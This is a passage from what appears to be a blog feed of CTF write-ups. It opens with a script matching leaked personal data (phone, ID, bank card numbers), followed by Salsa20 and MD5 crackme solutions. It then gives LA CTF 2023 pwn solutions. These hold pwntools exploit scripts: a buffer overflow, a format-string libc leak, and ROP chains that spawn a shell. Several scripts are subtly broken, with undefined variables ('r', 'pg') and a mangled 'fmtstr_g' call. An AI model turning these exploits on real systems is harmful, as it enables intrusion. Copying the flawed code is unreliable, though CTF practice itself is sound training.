class="hljs-string">&#x27;中学&#x27;</span>, <span class="hljs-string">&#x27;小学&#x27;</span>, <span class="hljs-string">&#x27;幼儿园&#x27;</span>, <span class="hljs-string">&#x27;培训中心&#x27;</span>, <span class="hljs-string">&#x27;分部&#x27;</span>, <span class="hljs-string">&#x27;分校&#x27;</span>]:<br>        <span class="hljs-keyword">if</span> val.endswith(w):<br>            <span class="hljs-keyword">return</span> val, <span class="hljs-string">&#x27;school&#x27;</span><br><br>    val = re.findall(<span class="hljs-string">&#x27;[^\u4e00-\u9fa5]+&#x27;</span>,val)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> val:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    val = val[<span class="hljs-number">0</span>]<br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> val:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>) &lt;= <span class="hljs-built_in">ord</span>(i) &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>):<br>            s += i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(s) == <span class="hljs-number">17</span> <span class="hljs-keyword">and</span> i == <span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&#x27;X&#x27;</span>:<br>            s += i<br>        <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">13</span> &lt;= <span class="hljs-built_in">len</span>(s) &lt;= <span class="hljs-number">17</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(s[:<span class="hljs-number">3</span>]) <span class="hljs-keyword">in</span> valid_bank_card_prefix:<br>            <span class="hljs-keyword">return</span> val, <span class="hljs-string">&#x27;bank_card&#x27;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(s) == <span class="hljs-number">18</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">13</span> &lt;= <span class="hljs-built_in">int</span>(s[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]) &lt;= <span class="hljs-number">24</span>:<br>            <span class="hljs-keyword">return</span> val, <span class="hljs-string">&#x27;cert_no&#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work_for_txt</span>(<span class="hljs-params">path, filename</span>):<br>    <span class="hljs-keyword">global</span> result<br>    data[filename] = &#123;<br>        <span class="hljs-string">&#x27;data&#x27;</span>: <span class="hljs-literal">None</span>,<br>        <span class="hljs-string">&#x27;meta&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;filename&#x27;</span>: filename,<br>            <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-built_in">list</span>()<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br>    <br>    content,<span class="hljs-built_in">type</span> = parse_content(lines)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;table&#x27;</span>:<br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>] = content[<span class="hljs-string">&#x27;header&#x27;</span>].copy()<br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;length&#x27;</span>] = <span class="hljs-built_in">len</span>(content[<span class="hljs-string">&#x27;data&#x27;</span>])<br>        data[filename][<span class="hljs-string">&#x27;data&#x27;</span>] = content[<span class="hljs-string">&#x27;data&#x27;</span>].copy()<br><br>        <span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>]):<br>            _d = &#123;&#125;<br>            <span class="hljs-keyword">if</span> item.lower() <span class="hljs-keyword">in</span> varibs:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;length&#x27;</span>]):<br>                    _d[format_var(data[filename][<span class="hljs-string">&#x27;data&#x27;</span>][i][index], item.lower())] = i<br>            data[filename][<span class="hljs-string">f&#x27;p_<span class="hljs-subst">&#123;item.lower()&#125;</span>&#x27;</span>] = _d.copy()<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;json&#x27;</span>:<br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>] = <span class="hljs-built_in">list</span>(content[<span class="hljs-number">0</span>].keys())<br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;length&#x27;</span>] = <span class="hljs-built_in">len</span>(content)<br>        <br>        lines = []<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> content:<br>            _l = []<br>            <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>]:<br>                _l.append(line[item])<br>            lines.append(_l)<br>        data[filename][<span class="hljs-string">&#x27;data&#x27;</span>] = lines.copy()<br><br>        <span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>]):<br>            _d = &#123;&#125;<br>            <span class="hljs-keyword">if</span> item.lower() <span class="hljs-keyword">in</span> varibs:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;length&#x27;</span>]):<br>                    _d[format_var(data[filename][<span class="hljs-string">&#x27;data&#x27;</span>][i][index], item.lower())] = i<br>            data[filename][<span class="hljs-string">f&#x27;p_<span class="hljs-subst">&#123;item.lower()&#125;</span>&#x27;</span>] = _d.copy()<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;line&#x27;</span>:<br>        header = [<span class="hljs-string">&#x27;phone&#x27;</span>, <span class="hljs-string">&#x27;cert_no&#x27;</span>, <span class="hljs-string">&#x27;school&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;bank_card&#x27;</span>]<br>        _data = []<br>        <span class="hljs-comment"># content = re.findall(&#x27;(,([\u4e00-\u9fa5]+?),)|(,([^\u4e00-\u9fa5]+\d),?)&#x27;, content)</span><br>        content = content.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content:<br>            _d = [<span class="hljs-string">&#x27;xenny&#x27;</span>]*<span class="hljs-number">5</span><br>            <br>            v,<span class="hljs-built_in">type</span> = parse_item(item)<br>            <br>            <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                _d[header.index(<span class="hljs-built_in">type</span>)] = v<br>                _data.append(_d)<br>        <br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>] = header.copy()<br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;length&#x27;</span>] = <span class="hljs-built_in">len</span>(_data)<br>        data[filename][<span class="hljs-string">&#x27;data&#x27;</span>] = _data.copy()<br><br>        <span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>]):<br>            _d = &#123;&#125;<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;length&#x27;</span>]):<br>                <span class="hljs-keyword">if</span> data[filename][<span class="hljs-string">&#x27;data&#x27;</span>][i][index] != <span class="hljs-string">&#x27;xenny&#x27;</span>:<br>                    _d[format_var(data[filename][<span class="hljs-string">&#x27;data&#x27;</span>][i][index], item.lower())] = i<br>            data[filename][<span class="hljs-string">f&#x27;p_<span class="hljs-subst">&#123;item.lower()&#125;</span>&#x27;</span>] = _d.copy()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(filename, <span class="hljs-built_in">type</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leakwork_for_txt</span>(<span class="hljs-params">path, filename</span>):<br>    <span class="hljs-keyword">global</span> result<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br>    <br>    content,<span class="hljs-built_in">type</span> = parse_content(lines)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;table&#x27;</span>:<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content[<span class="hljs-string">&#x27;header&#x27;</span>]:<br>            <span class="hljs-keyword">if</span> item.lower() <span class="hljs-keyword">in</span> varibs:<br>                <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> content[<span class="hljs-string">&#x27;data&#x27;</span>]:<br>                    res = locate_file(v[content[<span class="hljs-string">&#x27;header&#x27;</span>].index(item.lower())], item.lower())<br>                    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        <span class="hljs-comment"># print(res)</span><br>                        result.append(<span class="hljs-string">&#x27;,&#x27;</span>.join((filename,)+res) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;json&#x27;</span>:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> content:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> line:<br>                <span class="hljs-keyword">if</span> k.lower() <span class="hljs-keyword">in</span> varibs:<br>                    res = locate_file(line[k], k.lower())<br>                    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        result.append(<span class="hljs-string">&#x27;,&#x27;</span>.join((filename,)+res) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;line&#x27;</span>:<br>        <span class="hljs-comment"># content = re.findall(&#x27;(,(.+?),)|(,([^\u4e00-\u9fa5]+\d))&#x27;, content)</span><br>        content = content.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content:<br>            v,<span class="hljs-built_in">type</span> = parse_item(item)<br>            <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                res = locate_file(v, <span class="hljs-built_in">type</span>)<br>                <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    result.append(<span class="hljs-string">&#x27;,&#x27;</span>.join((filename,)+res) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leakwork_for_pic</span>(<span class="hljs-params">path, filename</span>):<br>    <span class="hljs-keyword">global</span> result<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        content = json.load(f)[<span class="hljs-string">&#x27;content&#x27;</span>]<br>    <span class="hljs-keyword">if</span> content.count(<span class="hljs-string">&#x27;，&#x27;</span>) &gt; <span class="hljs-number">10</span>:<br>        content = content.split(<span class="hljs-string">&#x27;，&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        content = content.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content:<br>        <span class="hljs-keyword">for</span> it <span class="hljs-keyword">in</span> item.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>            v,<span class="hljs-built_in">type</span> = parse_item(it.strip().strip(<span class="hljs-string">&#x27;，&#x27;</span>).strip())<br>            <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                res = locate_file(v, <span class="hljs-built_in">type</span>)<br>                <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    result.append(<span class="hljs-string">&#x27;,&#x27;</span>.join((filename,)+res) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>():<br>    path1 = <span class="hljs-string">&#x27;./内部数据/table_files&#x27;</span><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(path1):<br>        work_for_table(os.path.join(path1, filename), filename)<br><br>    path2 = <span class="hljs-string">&#x27;./内部数据/txt_files&#x27;</span><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(path2):<br>        work_for_txt(os.path.join(path2, filename), filename)<br>    <span class="hljs-keyword">pass</span><br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_work</span>():<br>    path1 = <span class="hljs-string">&#x27;./泄漏数据/table_files&#x27;</span><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> tqdm(os.listdir(path1)):<br>        <span class="hljs-keyword">try</span>:<br>            leakwork_for_table(os.path.join(path1, filename), filename)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>    <br>    path2 = <span class="hljs-string">&#x27;./泄漏数据/txt_files&#x27;</span><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> tqdm(os.listdir(path2)):<br>        <span class="hljs-keyword">try</span>:<br>            leakwork_for_txt(os.path.join(path2, filename), filename)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br><br>    path3 = <span class="hljs-string">&#x27;./泄漏数据/pic_files&#x27;</span><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> tqdm(os.listdir(path3)):<br>        <span class="hljs-keyword">try</span>:<br>            leakwork_for_pic(os.path.join(path3, filename), filename[:-<span class="hljs-number">4</span>])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br><br><br>work()<br>leak_work()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w+&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.writelines(result)<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Encryptedfile"><a href="#Encryptedfile" class="headerlink" title="Encryptedfile"></a>Encryptedfile</h3><p>ida看特征发现可能是salsa加密，二进制打开要输入4位key，怀疑是4位key加密文件，软件告诉了key是4个数字，所以爆破4位key解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> Salsa20<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag.png.enc&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    buffer = f.read()<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                key = <span class="hljs-built_in">str</span>(a) + <span class="hljs-built_in">str</span>(b) + <span class="hljs-built_in">str</span>(c) + <span class="hljs-built_in">str</span>(d)<br>                key = key.ljust(<span class="hljs-number">32</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>).encode()<br>                nonce = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x24</span>]*<span class="hljs-number">8</span>)<br>                cipher = Salsa20.new(key=key, nonce=nonce)<br>                plain = cipher.decrypt(buffer)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;PNG&#x27;</span> <span class="hljs-keyword">in</span> plain[:<span class="hljs-number">4</span>]:<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                        f.write(plain)<br><br><span class="hljs-comment">#跑出flag.png flag就在上面</span><br></code></pre></td></tr></table></figure><h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h3><p>使用 IDA Pro 分析程序，观察到机器码为 666666666666，并将其修改为题目需要更改的编码’1653643685031597’。接着，使用 FindCrypt 工具发现许多变量都与 MD5 算法相关，于是调试程序以查看具体的函数实现。发现这两个函数是 MD5 的 digest 实现函数，进一步分析发现后面的函数实际上是实现 MD5 hash 的。经过多次调试和分析，发现在加密后的函数中，key 值为 1228240365737281。<br>flag{1228240365737281}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LA CTF 2023</title>
    <link href="/2023/02/14/LACTF2023/"/>
    <url>/2023/02/14/LACTF2023/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/LACTF2023/lactf.gif"></p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="1-gatekeep"><a href="#1-gatekeep" class="headerlink" title="1. gatekeep"></a>1. gatekeep</h4><p>There is an overflow in the gets() function, so if the input is greater than char s1[15], the check() function can be bypassed and the flag can be obtained.</p><p><img src="/mdimg/LACTF2023/6.png"></p><h4 id="2-bot"><a href="#2-bot" class="headerlink" title="2. bot"></a>2. bot</h4><p><code>gets()</code> has an overflow, and <code>strcmp()</code> has a bug where it stops reading input after a NULL byte. So the question asks you to take the input, then compare it to some string before returning it. All you have to do is write a NULL byte-terminated string, and the write buffer overflows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="3-rut-roh-relro"><a href="#3-rut-roh-relro" class="headerlink" title="3.rut-roh-relro"></a>3.<strong>rut-roh-relro</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="4-redact"><a href="#4-redact" class="headerlink" title="4.redact"></a>4.redact</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="1-one-more-time-pad"><a href="#1-one-more-time-pad" class="headerlink" title="1. one-more-time-pad"></a>1. one-more-time-pad</h4><p>Just 